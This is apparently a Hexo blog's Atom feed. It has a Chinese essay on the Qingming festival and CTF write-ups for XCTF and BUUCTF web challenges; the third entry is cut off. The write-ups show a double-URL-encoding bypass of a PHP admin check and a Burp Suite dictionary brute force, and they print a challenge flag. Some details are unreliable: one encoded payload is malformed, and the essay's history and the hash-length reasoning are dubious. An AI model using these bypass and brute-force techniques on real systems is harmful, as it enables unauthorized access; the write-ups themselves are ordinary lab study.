<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>月亮之下的家</title>
  <icon>https://www.gravatar.com/avatar/a0257f72ad1be5e15aaef272e1009864</icon>
  <subtitle>在你漫长的成才经历，也许挫折会跟随着你，但幸运也会陪伴着你；只有勇敢得面对挫折，你的人生才会成功…</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-04-05T00:13:03.872Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>tao</name>
    <email>25373010068@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于清明节</title>
    <link href="http://example.com/2023/04/05/%E5%85%B3%E4%BA%8E%E6%B8%85%E6%98%8E%E8%8A%82/"/>
    <id>http://example.com/2023/04/05/%E5%85%B3%E4%BA%8E%E6%B8%85%E6%98%8E%E8%8A%82/</id>
    <published>2023-04-05T00:11:47.988Z</published>
    <updated>2023-04-05T00:13:03.872Z</updated>
    
    <content type="html"><![CDATA[<p>Welcom</p><h1 id="关于清明节"><a href="#关于清明节" class="headerlink" title="关于清明节"></a>关于清明节</h1><p>清明节是中国传统节日之一，也是最重要的祭祀节日之一。每年农历清明节前后，人们会回到故乡或祖坟前祭拜祖先和亲人，这是表达家族情感、弘扬中华文化的一种方式。本文将从历史、文化、风俗、民俗、经济、环境等多个方面对清明节进行详细介绍。 </p><h3 id="一、历史清明节的历史"><a href="#一、历史清明节的历史" class="headerlink" title="一、历史清明节的历史"></a>一、历史清明节的历史</h3><p>清明节是中国传统节日之一，也是中国二十四节气中的一个节气。在清明节这个节日里，人们会进行祭祖和扫墓等传统活动，同时也会踏青赏花、游玩郊外，感受春天的气息和生机勃勃的景象。</p><p>起源清明节起源于先秦时期，距今已经有两千五百多年的历史。据《周礼·天官·冢宰》记载，“春分后十五日曰清明”。春分是农历二十四节气之一，表示太阳直射赤道，昼夜平分，也是传统的“立春、立夏、立秋、立冬”四个重要节气之一。春分节气标志着冬季结束，春季开始。而在春分后的第15天，人们就要开始进行清明节的祭扫活动了。据传说，清明节最初起源于古代帝王为了表达对逝者的敬仰和怀念，选定一个特定的日子进行纪念。据《尚书》中的记录，早在殷商时期，就有在皇家祭祀中进行清明扫墓的记录。到了战国时期，这个传统已经渗透到了民间。据《吕氏春秋》的记载，楚威王的儿子居于虞山下，王每年清明节都会亲自前往祭拜，后来百姓也效仿王的行动。这就是“踏青”的由来，也就是在清明这个时候，人们到郊外去踏青、祭扫和游玩。</p><p>随着时间的推移，清明节逐渐发展成为一个家庭聚会和纪念祖先的节日。清明节除了祭祖之外，还有一些其他的民俗活动，如踏青赏花、荡秋千、放风筝等，这些活动代表着人们对春天的追求和美好生活的向往。</p><p>历史演变清明节作为中国传统节日之一，经过了长期的演变过程。在不同的历史时期，清明节的庆祝方式也有所不同。</p><p>古代在古代，清明节主要是供奉祖先扫墓、祭祀祖宗的节日。早在周朝时期，就有在皇家祭祀中进行清明扫墓的记录。到了唐宋时期，清明节已经成为重要的节日之一，各地也开始出现了一些特色鲜明的习俗。</p><p>在唐代，清明节时有“金粉世界”和“翠野春光”两种活动。“金粉世界”是皇帝亲自前往景山（北京市）祭扫的场面，“翠野春光”则是百姓到郊外游玩、踏青赏花的活动。</p><p>近现代随着社会的发展，清明节的庆祝方式也逐渐发生了变化。在现代社会，人们除了祭祖扫墓之外，还会进行一些其他的活动，如踏青、赏花、荡秋千、放风筝等。这些活动不仅有助于人们锻炼身体，也表达了人们对春天的向往和生命的美好祝愿。另一方面，在现代社会，环保意识日益增强，清明节也成为了一个重要的环保节日。在清明节期间，人们进行祭扫活动，清理墓地，清除杂草和垃圾，同时也提高了人们对环境保护和生态平衡的重视程度。</p><h3 id="二、文化-关清明节的文化"><a href="#二、文化-关清明节的文化" class="headerlink" title="二、文化 关清明节的文化"></a>二、文化 关清明节的文化</h3><p>清明节是中华民族的传统节日之一，具有悠久的历史和深厚的文化内涵。在这个节日里，人们通过祭祖扫墓、踏青赏花、清理墓地等活动来表达对逝去亲人的怀念和敬意，同时也感恩生命、向往未来。清明节的起源及历史演变清明节起源于先秦时期，距今已经有两千五百多年的历史。据《周礼·天官·冢宰》记载，“春分后十五日曰清明”。春分是农历二十四节气之一，表示太阳直射赤道，昼夜平分，也是传统的“立春、立夏、立秋、立冬”四个重要节气之一。春分节气标志着冬季结束，春季开始。而在春分后的第15天，人们就要开始进行清明节的祭扫活动了。随着时间的推移，清明节逐渐发展成为一个家庭聚会和纪念祖先的节日。清明节除了祭祖之外，还有一些其他的民俗活动，如踏青赏花、荡秋千、放风筝等，这些活动代表着人们对春天的追求和美好生活的向往。在古代，清明节主要是供奉祖先扫墓、祭祀祖宗的节日。早在周朝时期，就有在皇家祭祀中进行清明扫墓的记录。到了唐宋时期，清明节已经成为重要的节日之一，各地也开始出现了一些特色鲜明的习俗。随着社会的发展，清明节的庆祝方式也逐渐发生了变化。在现代社会，人们除了祭祖扫墓之外，还会进行一些其他的活动，如踏青、赏花、荡秋千、放风筝等。</p><p>尊重祖先、缅怀先人清明节是祭祖扫墓的日子，表达了人们对逝去亲人的怀念和敬意，同时也是对未来的祈愿。祭祖扫墓不仅是一种物质上的供奉，更是一种精神上的尊重和怀念。</p><p>环保意识随着社会的发展，环保意识日益增强，清明节也成为了一个重要的环保节日。在清明节期间，人们进行祭扫活动，清理墓地，清除杂草和垃圾，以示对逝去亲人的尊重和怀念。同时也提高了人们对环境保护和生态平衡的重视程度。</p><h3 id="三、关于清明节文化的风俗"><a href="#三、关于清明节文化的风俗" class="headerlink" title="三、关于清明节文化的风俗"></a>三、关于清明节文化的风俗</h3><p>清明节是中华民族的传统节日之一，具有深厚的文化内涵和丰富的风俗习惯。以下是清明节的一些传统风俗介绍。</p><p>祭祖扫墓祭祖扫墓是清明节最重要的传统风俗之一。在这一天，人们会前往祖先的坟墓或骨灰盒前烧香祭拜、添置鲜花、纸钱等供品，并进行祭文颂词。这个传统习俗旨在表达对逝去亲人的怀念和敬意，同时也是对未来的祈愿。祭祖扫墓前，通常会将墓地打扫干净，清除杂草和垃圾，以示对逝去亲人的尊重和怀念。</p><p>踏青赏花在清明节这个时刻，春天已经来临，大自然开始恢复生机。因此，人们也会在这个节日里踏青赏花、游玩郊外。在中国古代，清明节的“踏青”活动起源于楚国人民在这一天集体登高远眺的传统。</p><p>踏青赏花不仅可以欣赏到美丽的风景，还有助于增强人们的身体素质和锻炼身体。同时，踏青赏花也是人们缓解压力、放松身心的好机会。扫墓用品</p><p>祭祖扫墓是清明节最重要的传统习俗之一。为了表示对逝者的尊重和怀念，人们通常会带上一些特定的物品去墓地进行祭拜和扫墓。其中，比较常见的祭品包括：鲜花、香烛、细腻的纸钱、水果、糕点等。同时，还有些地方会特别准备木牌、红绸、白酒等物品，以供祭拜之用。</p><h3 id="四、清明节的食俗"><a href="#四、清明节的食俗" class="headerlink" title="四、清明节的食俗"></a>四、清明节的食俗</h3><p>清明节的食俗也是不可忽视的一个方面。在这个节日里，人们通常会食用寒食和清明粥等传统食品。寒食是指清明节前两天要禁火，吃冷饮和冷食的传统，在中国北方也有吃花卷和蒸饺子等习俗。而清明粥则是一种由糯米、枸杞、莲子、红枣等原料熬成的甜粥，象征着生命的美好和丰收的喜悦。</p><p>荡秋千是清明节期间常见的一项游戏和娱乐活动。它起源于古代民间，是一种在清明节里广泛传承的文化活动之一。荡秋千的过程大致为：坐在秋千上，由其他人推动秋千，使其达到最高点。这个游戏不仅有助于锻炼身体，还能增强人们的团结合作意识和互相帮助的精神。</p><p>放风筝也是清明节四、民俗 清明节民俗的表现形式多样，因地域和文化差异而有所不同。在北方地区，人们会在清明节前后吃清明馄饨、青团等食品，这些食品形状各异，寓意着追思祖先和纪念历史。在南方地区，人们则会烹制“清明蒸饭”、“清明芋艿”等特色美食，这些美食口感鲜美，也是祭祀祖先的重要物品。此外，一些地区还有龙船比赛、踩高跷、打秧歌等传统民俗活动，这些活动不仅能够增加乡村的生气和活力，也是传承和弘扬民俗文化的重要途径。</p><h3 id="五、经济关于清明节的经济"><a href="#五、经济关于清明节的经济" class="headerlink" title="五、经济关于清明节的经济"></a>五、经济关于清明节的经济</h3><p>清明节不仅是中国传统文化中的一个重要节日，同时也对经济产生了一定的影响。以下是几个方面的介绍。</p><p>清明节期间，人们通常会出游观光、踏青赏花。因此，旅游业也是这个节日带来的经济效益之一。各地也会有一些特色景点和活动，如登山、赏花等旅游项目，来吸引游客。在旅游业方面，清明节更为知名的景点包括举世闻名的西湖、黄山风景区、承德避暑山庄、广州白云山、成都青城山等。许多旅游景区和企业也会在清明节前后推出各种优惠、促销活动，以吸引更多游客。</p><p>随着清明节的到来，许多家庭也会在这一天备办丰盛的晚宴，或外出就餐。因此，餐饮业也成为了清明节带来的一项经济收入。在清明节期间，许多餐厅和饭店也会推出一些特色菜品，如清明粥、寒食等传统食品，以及其他一些特色菜肴，来吸引消费者。同时，也会有一些餐厅和饭店推出优惠、折扣等活动，以提高销售额。交通运输业</p><p>随着人们出游和祭祀的增加，交通运输业也成为了一个重要的经济支柱。在清明节期间，铁路、公路、航空等各种交通方式都会迎来客流高峰。为了满足旅客的出行需求，车站、机场等交通节点也会加强安保、道路疏导等措施，确保交通安全和顺畅。而对于交通企业来说，清明节也是一个重要的时刻，他们需要合理调度运力，确保事故率低廉，同时保证客户服务质量，取得丰厚的经济利益。</p><p>清明节也是商业零售业的重要节日之一。在这个节日里，人们通常会购买一些祭祖用品、鲜花、食品和礼品等物品。</p><p>商家和超市等零售业者也会根据节日需求推出一些促销活动，如打折、赠品等，以吸引消费者。在清明节前后，商场、超市等零售企业的销售额也会有所提高。</p><p>近年来，随着互联网和移动互联网的普及，电子商务也成为清明节带来的一个经济支柱。许多人通过电子商务平台购买祭祖用品、鲜花、食品和礼品等物品。各大电商平台也会推出一些促销活动，如折扣、满减、秒杀等，以吸引消费者。据统计，清明节期间，中国的电子商务交易总额也呈现出增长的态势。</p><h3 id="六、环境-环境关于清明节的环境"><a href="#六、环境-环境关于清明节的环境" class="headerlink" title="六、环境 环境关于清明节的环境"></a>六、环境 环境关于清明节的环境</h3><p>清明节作为一个传统节日，也在一定程度上对环境产生了影响。以下是几个方面的介绍。</p><p>扫墓祭祖清明节期间，人们通常会前往祖先的坟墓或骨灰盒前烧香祭拜、添置鲜花、纸钱等供品，并进行祭文颂词。这个传统习俗旨在表达对逝去亲人的怀念和敬意，同时也是对未来的祈愿。然而，在进行祭祀活动时，如果不注意环境保护，就会对周围的自然环境造成污染。比如，放置大量纸钱或者其他祭品，容易导致垃圾堆积和火灾等问题。因此，在祭祀活动中应尽可能采取环保措施，例如使用可降解的祭品等。</p><p>避免过度开销在清明节期间，许多人会购买各种祭品、鲜花、食品和礼物等物品，以表达对已故亲人的怀念和缅怀之情。然而，如果过度消费，就会对环境产生负面影响。一方面，过度的消费会导致资源浪费和环境污染。例如，购买大量纸钱和其他祭品，容易导致垃圾堆积和对水源、土壤等环境造成污染。另一方面，过度的消费也会加剧社会贫富差距，使得一些人难以承受节日开销。</p><p>因此，在清明节期间，我们应该避免过度开销，尽可能采用可持续、环保的消费方式，减少对环境的负面影响。</p><p>随着全球气候变化和环境问题的日益严重，推广低碳生活已经成为了一个全球性的趋势。在清明节期间，我们可以通过一些行动来推广低碳生活，比如：通过这些行动，我们可以减少碳排放和环境污染，同时也提高了公众的环保意识和责任感。</p><p>在清明节期间，为避免祭祀活动对环境产生负面影响，政府和社会组织应加强对环境的监管和管理。例如：</p><ul><li><p>对祭祀地点进行环境整治，保持环境卫生；</p></li><li><p>对祭祀者的行为进行监管，禁止乱扔垃圾和燃放烟花等行为；</p></li><li><p>鼓励使用环保鲜花和纸钱等物品，减少塑料和其他污染物的使用；</p></li><li><p>对违规行为进行处罚和制止，以保护环境和生态系统的完整。</p><p>通过加强环境监管，我们可以促进清明节祭祀活动的环保和可持续发展，实现经济、社会和环境的协调和谐。</p><p>随着城市化和人口增长，交通拥堵和环境污染已经成为了一个全球性的问题。在清明节期间，我们可以通过推广绿色出行来减少交通拥堵和碳排放。</p><p>具体而言，我们可以鼓励大家选择使用公共交通工具或自行车来出行，减少个人汽车的使用。此外，我们也可以倡导步行、慢跑等健康低碳的出行方式，这不仅有益于环境，还可以提高我们的健康水平。</p><p>清明节是一个传统的生态文明节日，我们应该倡导保护生态环境的理念，宣传生态文明的价值观和目标。</p><p>具体而言，我们可以采取以下措施：</p><ul><li>加强对自然生态系统的保护和管理；</li><li>倡导垃圾分类和回收利用，减少垃圾对环境的污染；</li><li>种植绿化植物、树木等，促进城市绿化和生态环境的改善；</li><li>倡导节约用水、用电等习惯，减少能源消耗和环境污染。</li></ul><p>通过这些措施，我们可以保护生态环境，促进可持续发展，实现经济、社会和环境的协调和谐。</p></li></ul><p>总之，清明节作为中国传统节日，既有着深厚的历史和文化底蕴，又包含着丰富多彩的民俗和风俗。在这个节日里，人们表达着对祖先的缅怀和尊敬，传承着中华文化的精髓，同时也倡导着环保和生态友好的理念。希望通过本文的介绍，能够让更多的人了解和热爱这个传统节日，同时也更好地保护环境和文化遗产。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcom&lt;/p&gt;
&lt;h1 id=&quot;关于清明节&quot;&gt;&lt;a href=&quot;#关于清明节&quot; class=&quot;headerlink&quot; title=&quot;关于清明节&quot;&gt;&lt;/a&gt;关于清明节&lt;/h1&gt;&lt;p&gt;清明节是中国传统节日之一，也是最重要的祭祀节日之一。每年农历清明节前后，人们会回到故乡或</summary>
      
    
    
    
    <category term="节日" scheme="http://example.com/categories/%E8%8A%82%E6%97%A5/"/>
    
    
    <category term="节日" scheme="http://example.com/tags/%E8%8A%82%E6%97%A5/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界Web</title>
    <link href="http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/"/>
    <id>http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/</id>
    <published>2023-03-13T07:15:21.552Z</published>
    <updated>2023-03-18T12:33:55.613Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome</p><meta name="referrer" content="no-referrer"/><h2 id="一、攻防世界PHP2详细解答"><a href="#一、攻防世界PHP2详细解答" class="headerlink" title="一、攻防世界PHP2详细解答"></a>一、攻防世界PHP2详细解答</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/4f5b1f4e9dae688c6325733666affff6.png" alt="img"></p><h3 id="1-进入环境"><a href="#1-进入环境" class="headerlink" title="1.进入环境"></a>1.进入环境</h3><p>看到一句话“Can you anthenticate to this website?”意思为：你能认证到这个网站吗？</p><p><img src="https://img-blog.csdnimg.cn/img_convert/055ab8d21925215fbb39bc931233b0e5.png" alt="img"></p><h3 id="2-burpsuite"><a href="#2-burpsuite" class="headerlink" title="2.burpsuite"></a>2.burpsuite</h3><p>用burpsuite抓包后也没有什么重要的信息o(一︿一+)o</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a91b4cf3fc079c1b57a12747186c0553.png" alt="img"></p><p>我们可以进入index.php，但页面并没有变化。</p><p>于是输入index.php开始有东西出来了。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/75f94568c3f583d2d5a017a6ef4965ec.png" alt="img"></p><p>在这里可能看的不明显，我们直接回到页面在后面+&#x2F;index.phps看看</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0188b5b682e717523d2dad59dacbc9f4.png" alt="img"></p><p>给出了一下代码</p><h3 id="3-解析代码"><a href="#3-解析代码" class="headerlink" title="3.解析代码"></a>3.解析代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure><p>只需一眼就可以看出这是一个 PHP 代码片段，用于检查用户是否具有访问网站的权限</p><ol><li>第一行是 PHP 的开头标记，表示 PHP 代码的开始。</li><li>第二行检查通过 URL 传递的 ‘id’ 参数的值是否等于 ‘admin’。如果它相等，则使用 ‘echo’ 函数显示消息“not allowed!”并使用 ‘exit’ 函数退出脚本。这是为了防止未经授权访问网站的管理员页面。</li><li>第六行使用 ‘urldecode’ 函数解码 ‘id’ 参数的 URL 编码值。</li><li>第七行检查 ‘id’ 参数的解码值是否等于 ‘admin’。如果它相等，则使用 ‘echo’ 函数显示消息“Access granted!”和一个密钥。</li><li>代码以 PHP 结束标记结束。</li></ol><p>咱们的目的就是求出这个密钥了( ¯▽¯；)</p><h3 id="4-但要注意的是这个函数urldecode"><a href="#4-但要注意的是这个函数urldecode" class="headerlink" title="4.但要注意的是这个函数urldecode"></a>4.但要注意的是这个函数<strong>urldecode</strong></h3><p><code>urldecode()</code> 是一个 PHP 函数，用于解码 URL 编码字符串。在 URL 中，一些字符是有特殊含义的，例如空格、问号、等号等。如果需要在 URL 中使用这些字符，就需要对其进行编码，将其转换成特定的编码格式。例如空格会被编码成 <code>%20</code>。<code>urldecode()</code> 函数可以将这些编码格式的字符解码回原始字符，以便使用或显示。</p><p>在上面的 PHP 代码片段中，<code>urldecode()</code> 函数用于解码传递的 ‘id’ 参数的 URL 编码值，以便后续判断 ‘id’ 参数的值是否等于 ‘admin’。</p><p>所以直接输入下面是不行的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:64170/?id=admin</span><br></pre></td></tr></table></figure><p>我们需要将admin进行转换，也就是进行url编码。</p><p>admin 的 URL 编码是 %61%64%6d%69%6e。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:64170/?id=%61%64%6d%69%6e</span><br></pre></td></tr></table></figure><p> 还是不行滴！</p><p>因为浏览器本身会进行因此url解码，这里相当于进行两次url解码，应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:64170/?id=%2561%2564%256d%2569256e</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b4489ef8ec16bef527d23f75e0847451.png" alt="img"></p><p>最后也是得到结果了！＼( ^▽^ )／</p><h3 id="5-知识总结：-✿◡‿◡"><a href="#5-知识总结：-✿◡‿◡" class="headerlink" title="5.知识总结：(✿◡‿◡)"></a>5.知识总结：(✿◡‿◡)</h3><p><strong>1.后缀名为.phps的文件：phps即php source，phps文件就是php的源代码文件，通常用于提供给用户查看php代码，因为用户无法通过web浏览器直接查看到php文件的内容，所以需要用phps文件代替</strong></p><p>2.<strong>在传入参数时，浏览器会对非ASCII编码进行一次urlencode，结果在代码执行时，相当于id还是admin，所以我们在传参时需要进行两次URL编码</strong></p><p>3.在URL编码中， “%” 符号是一个特殊字符，它被用来表示接下来的两个字符是一个ASCII值的十六进制表示。因此，如果我们想要在URL中出现一个 “%” 符号本身，而不是它的特殊含义，那么我们需要对它进行编码。</p><p>4.对于 “admin” 字符串，在进行一次URL编码后，会得到 “%61%64%6d%69%6e” 这个字符串。如果我们想对其进行二次URL编码，可以使用 “%25” 来代替每个 “%” 符号。由于 “%25” 在URL编码中表示 “%” 符号，所以最终的二次URL编码结果为 “%2561%2564%256d%2569%256e”。</p><p>5.另一方面，如果我们将 “%25” 放在 “dmin” 前面，会得到 “%25dmin”。这个字符串也可以被解码为 “admin”。这是因为，在进行URL解码时，系统会先解码所有出现的 “%” 符号，然后再将剩下的字符串解码为原始字符。因此，”<strong>%25dmin</strong>“ 和 “<strong>%2564%6d%69%6e</strong>“ 都可以被解码为 “admin”。</p><h1 id="二、攻防世界weak-auth浅学"><a href="#二、攻防世界weak-auth浅学" class="headerlink" title="二、攻防世界weak_auth浅学"></a>二、攻防世界weak_auth浅学</h1><h3 id="1、进入环境"><a href="#1、进入环境" class="headerlink" title="1、进入环境"></a>1、进入环境</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/bf15d3dd090e744f1042f8fe674b9c4e.png" alt="img"></p><p>当我们点进去的时候，出来一个网页，让我们输入username和password，先随便输入一下，然后弹出是说让我们用admin作为username登入</p><p><img src="https://img-blog.csdnimg.cn/img_convert/538c90a5e8799e835863e17e4a8d5996.png" alt="img"></p><p>那我们就按照它的要求吧，进行修改</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b91d986e355c99163dc0316f9f56198d.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/d7b50ac0ad9f095dc9f4d073a6d42437.png" alt="img"></p><p>这次它只是提醒了密码错误，我们的重心开始在密码上，什么提示也没给，没思路。。。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8c1c6ddbfffb417922ae416fd00b3fa1.png" alt="img"></p><p>但是仔细想了想，总感觉怪怪的，他没有返回到原来的界面，事出反常必有妖，按一下F12，它给出了一段绿色的字体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maybe you need a dictionary(或许你需要一个字典)</span><br></pre></td></tr></table></figure><p>字典，好了，瞬间清楚明了了。</p><h3 id="2-首先我们应该进行抓包"><a href="#2-首先我们应该进行抓包" class="headerlink" title="2.首先我们应该进行抓包"></a>2.首先我们应该进行抓包</h3><blockquote><p><strong>抓包（Packet Sniffing）是指通过监听网络数据包，来分析和获取网络通信的技术或行为。在网络通信中，数据包是信息传输的基本单位，抓包可以获取数据包中的各种信息，例如发送和接收的数据、通信的协议、源和目的地址等，从而帮助分析和监测网络流量，发现网络问题和安全漏洞。抓包常常被用于网络故障排查、网络安全检测、数据包分析和协议设计等领域。常用的抓包工具包括Wireshark、Tcpdump、Burp Suite等。</strong></p></blockquote><p>接下来我们就是应该用burpsuite进行字典爆破。首先先将那一页的代码发送到intruder</p><p><img src="https://img-blog.csdnimg.cn/img_convert/ca8492cc37dc3c648d902ff2cf99b545.png" alt="img"></p><h3 id="3-紧接着在intruder里的payloads里选择runtime"><a href="#3-紧接着在intruder里的payloads里选择runtime" class="headerlink" title="3.紧接着在intruder里的payloads里选择runtime"></a>3.紧接着在intruder里的payloads里选择runtime</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/3513eb42f7f4d4e7cf1b0afd6fc4946d.png" alt="img"></p><p>选择你的字典，字典可以在这里下载<a href="https://www.somd5.com/download/dict/">字典</a></p><h3 id="4-步骤完成后，我们就可以进行爆破了。"><a href="#4-步骤完成后，我们就可以进行爆破了。" class="headerlink" title="4.步骤完成后，我们就可以进行爆破了。"></a>4.步骤完成后，我们就可以进行爆破了。</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/c1cda94c56cbee95f1b5f6c2dd7ac546.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b82b575de7e10adca668a9ac7822caca.png" alt="img"></p><p>爆破后，我们可以看到上图里有一个长度与其他长度不同的，至于为什么正确的密码与其他的密码长度不同，我搜集了一些知识，希望有帮助。</p><blockquote><p><strong>在Burp Suite的字典爆破功能中，正确的密码与错误的密码在长度上可能是不同的，这可能由以下几个原因导致：</strong><br><strong>密码哈希算法的实现方式不同。不同的密码哈希算法可能会产生不同长度的哈希值，这可能会导致正确的密码哈希值长度与错误的密码哈希值长度不同。</strong><br><strong>在进行哈希计算时，使用的加盐方式不同。哈希计算时的加盐方式可能会影响哈希值长度，从而导致正确的密码哈希值长度与错误的密码哈希值长度不同。</strong><br><strong>密码本身的长度不同。如果正确的密码比错误的密码更长或更短，则其哈希值长度可能与错误的密码哈希值长度不同。</strong><br><strong>需要注意的是，密码哈希值长度不一定与密码本身长度相同。这是因为哈希算法的实现方式不同，会导致哈希值长度的差异。因此，在使用Burp Suite进行字典爆破时，我们需要考虑到以上的原因，并且针对具体情况进行调试和分析。</strong></p></blockquote><p>那我们输入123456，这就是密码，得到以下结果：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f451544a3725b81e73c5e35268b667ca.png" alt="img"></p><p>cyberpeace{89f86db4dcb3c9311ff8f2513065533e}</p><h3 id="5-知识总结o-一︿一"><a href="#5-知识总结o-一︿一" class="headerlink" title="5.知识总结o(一︿一+)"></a>5.知识总结o(一︿一+)</h3><p>一、在CTF的Web题目中，有很多涉及到密码爆破的题目，一般可以从以下几个方面来判断密码爆破类型：</p><ol><li><p>题目描述：通常题目描述中会给出一些提示，例如提示破解某个服务的密码，或者提示破解某个加密算法的密钥等。这些提示可以帮助我们确定密码爆破的类型。</p></li><li><p>请求响应：在使用Burp Suite等工具进行抓包分析时，可以查看请求响应，观察是否有类似密码错误、尝试次数限制等提示信息，或者观察是否有重复的请求，这些都可能是密码爆破的线索。</p></li><li><p>加密算法：如果题目中涉及到密码加密算法，可以通过分析算法的特点来判断密码爆破类型。例如，如果使用的是MD5加密算法，那么就可能是直接爆破明文密码或者使用彩虹表进行破解。</p></li><li><p>字典文件：如果题目中要求使用字典文件进行密码破解，那么可以判断为字典密码爆破类型。此时需要注意字典文件的大小和内容是否符合要求。</p></li></ol><p>总之，在CTF的Web题目中，需要通过分析题目描述、请求响应、加密算法和字典文件等方面，来判断密码爆破的类型，然后选择相应的工具和策略来进行破解。同时，需要遵守比赛规则，合法合规地进行破解。</p><p>二、Burp Suite是一个强大的Web应用程序安全测试工具，它包括多个模块，其中之一是字典密码爆破模块。这个模块可以通过自动化的方式，在用户提供的字典文件中尝试所有可能的密码组合，以破解用户的密码。</p><p>总结一下Burp Suite字典密码爆破的一些特点：</p><ol><li><p>字典文件：Burp Suite字典密码爆破模块需要用户提供一个包含所有可能密码的字典文件。字典文件可以是一个简单的文本文件，每行包含一个密码。</p></li><li><p>多种破解技术：Burp Suite字典密码爆破模块支持多种破解技术，包括暴力破解、智能破解和组合破解等。不同的破解技术可以根据不同的场景和要求进行选择。</p></li><li><p>配置选项：Burp Suite字典密码爆破模块还提供了多种配置选项，例如：破解时使用的线程数、HTTP响应超时时间、是否跟踪成功的登录请求等。</p></li><li><p>破解速度：Burp Suite字典密码爆破模块的破解速度取决于多个因素，例如字典文件的大小、目标应用程序的响应速度、破解时使用的线程数等。可以通过调整这些参数来提高破解速度。</p></li><li><p>使用注意事项：在使用Burp Suite字典密码爆破模块时，需要注意一些使用注意事项，例如：合理设置请求间隔时间、控制破解请求的数量、合理设置破解技术和字典文件等。此外，需要遵守法律法规和道德规范，仅在授权的范围内使用此工具。</p></li></ol><p>总之，Burp Suite字典密码爆破模块是一个功能强大的工具，可以帮助安全测试人员发现应用程序的密码漏洞，但需要谨慎使用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome&lt;/p&gt;
&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;一、攻防世界PHP2详细解答&quot;&gt;&lt;a href=&quot;#一、攻防世界PHP2详细解答&quot; class=&quot;headerlink&quot; title=&quot;一、</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>buuctfWeb</title>
    <link href="http://example.com/2023/03/05/web/"/>
    <id>http://example.com/2023/03/05/web/</id>
    <published>2023-03-04T22:12:03.249Z</published>
    <updated>2023-03-13T21:54:31.450Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome</p><meta name="referrer" content="no-referrer"/><h1 id="一、-极客大挑战-2019-Secret-File-1解题思路"><a href="#一、-极客大挑战-2019-Secret-File-1解题思路" class="headerlink" title="一、[极客大挑战 2019]Secret File 1解题思路"></a>一、[极客大挑战 2019]Secret File 1解题思路</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/7a7ca8cd81dfdde9a0379ea84d0d335c.png" alt="img"></p><h3 id="1-开启靶机"><a href="#1-开启靶机" class="headerlink" title="1.开启靶机"></a>1.开启靶机</h3><p>开启靶机后进入网址，没有什么好的信息</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6c5094598fefd7dd7333e2632ebff1d3.png" alt="img"></p><h3 id="2-按F12查看源代码"><a href="#2-按F12查看源代码" class="headerlink" title="2.按F12查看源代码"></a>2.按F12查看源代码</h3><p>发现了一个网址.&#x2F;Archive_room.php按CTRL键点击即可进入，可以看到</p><p><img src="https://img-blog.csdnimg.cn/img_convert/240faba07eaf97b3e701de1e7da7fca1.png" 